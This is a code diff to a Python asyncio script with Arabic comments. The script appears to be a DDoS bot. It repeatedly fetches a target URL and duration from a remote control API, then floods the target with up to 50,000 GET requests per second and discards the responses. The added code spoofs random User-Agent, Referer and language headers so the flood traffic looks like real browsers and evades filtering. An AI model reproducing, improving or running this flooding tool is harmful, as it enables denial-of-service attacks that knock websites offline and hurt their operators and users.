@@ -2,16 +2,47 @@ import aiohttp
 import asyncio
 import time
 import xml.etree.ElementTree as ET
+from fake_useragent import UserAgent
+import random
 
 MAX_REQUESTS_PER_SECOND = 50000
 
+# قائمة بالـ Referers الحقيقية التي يمكن استخدامها
+referrers = [
+    "https://www.google.com/",
+    "https://www.facebook.com/",
+    "https://www.twitter.com/",
+    "https://www.instagram.com/",
+    "https://www.linkedin.com/",
+    "https://www.reddit.com/",
+    "https://www.wikipedia.org/",
+    "https://www.amazon.com/",
+    "https://www.youtube.com/"
+]
+
+# إنشاء وكيل مستخدم عشوائي باستخدام fake_useragent
+ua = UserAgent()
+
+# دالة إرسال الطلبات
 async def send_request(session, url):
+    # توليد وكيل مستخدم عشوائي
+    user_agent = ua.random
+    referrer = random.choice(referrers)  # اختيار referrer عشوائي من القائمة
+    headers = {
+        'User-Agent': user_agent,
+        'Referer': referrer,  # استخدام referrer عشوائي
+        'Accept-Language': random.choice(['en-US', 'en-GB', 'fr-FR', 'de-DE', 'ar-SA']),  # اختيار لغة عشوائية
+        'Accept-Encoding': 'gzip, deflate, br',  # الترميزات المقبولة
+        'Connection': 'keep-alive',  # الاتصال المستمر لتقليد المتصفح
+    }
+
     try:
-        async with session.get(url):
+        async with session.get(url, headers=headers):
             pass
     except Exception as e:
         pass
 
+# دالة جلب التعليمات من الـ API
 async def get_instructions():
     api_url = 'http://nrcf.medianewsonline.com/api/index.php'
     
@@ -35,6 +66,7 @@ async def get_instructions():
     except Exception as e:
         return None, None
 
+# دالة إرسال الطلبات دفعة واحدة
 async def send_requests_in_batch(url, duration):
     async with aiohttp.ClientSession() as session:
         start_time = time.time()
@@ -50,6 +82,7 @@ async def send_requests_in_batch(url, duration):
             if elapsed_time < 1:
                 await asyncio.sleep(1 - elapsed_time)
 
+# دالة الرئيسية
 async def main():
     while True:
         url, duration = await get_instructions()
